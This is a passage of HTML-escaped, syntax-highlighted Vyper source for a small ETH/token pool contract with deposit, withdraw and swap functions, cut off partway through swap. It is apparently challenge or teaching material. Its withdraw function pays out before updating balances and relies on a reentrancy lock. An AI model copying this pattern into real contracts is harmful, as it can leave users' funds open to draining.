&lt;&#x2F;span&gt;&lt;span&gt;    user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;event Withdraw&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;event Swap&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    tokenIn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    tokenOut&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;indexed&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;    amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ETH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constant&lt;&#x2F;span&gt;&lt;span&gt;(address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NCOINS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constant&lt;&#x2F;span&gt;&lt;span&gt;(int128) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;BONUS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constant&lt;&#x2F;span&gt;&lt;span&gt;(uint256) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4276545
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;(address)
&lt;&#x2F;span&gt;&lt;span&gt;initialized&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;coins&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;(address[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NCOINS&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;ratio&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;(uint256)
&lt;&#x2F;span&gt;&lt;span&gt;balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;(HashMap[int128, HashMap[address, uint256]])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;payable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;initialized &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= False
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;initialize&lt;&#x2F;span&gt;&lt;span&gt;(underlying&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;address):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== self.&lt;&#x2F;span&gt;&lt;span&gt;owner
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert not self.&lt;&#x2F;span&gt;&lt;span&gt;initialized, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;has been initialized&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= ETH
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;coins[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;underlying
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;ratio &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;initialized &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= True
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;payable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;nonreentrant(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;lock&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;(index&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert self.&lt;&#x2F;span&gt;&lt;span&gt;initialized, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;not available yet&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; NCOINS
&lt;&#x2F;span&gt;&lt;span&gt;    token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= self.&lt;&#x2F;span&gt;&lt;span&gt;coins[index]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== ETH&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raw_call&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(token)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;balances[index][msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;amount
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    log &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Deposit&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;nonreentrant(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;lock&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(index&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert self.&lt;&#x2F;span&gt;&lt;span&gt;initialized, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;not available yet&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; NCOINS
&lt;&#x2F;span&gt;&lt;span&gt;    token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= self.&lt;&#x2F;span&gt;&lt;span&gt;coins[index]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert self.&lt;&#x2F;span&gt;&lt;span&gt;balances[index][msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== ETH&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;raw_call&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(token)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;self.&lt;&#x2F;span&gt;&lt;span&gt;balances[index][msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;amount
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    log &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Withdraw&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;payable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;nonreentrant(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;lock&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(in_index&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;out_index&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;int128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert self.&lt;&#x2F;span&gt;&lt;span&gt;initialized, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;not available yet&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;in_index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;in_index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; NCOINS
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;out_index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;out_index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; NCOINS
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;in_index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;out_index
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;in_index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
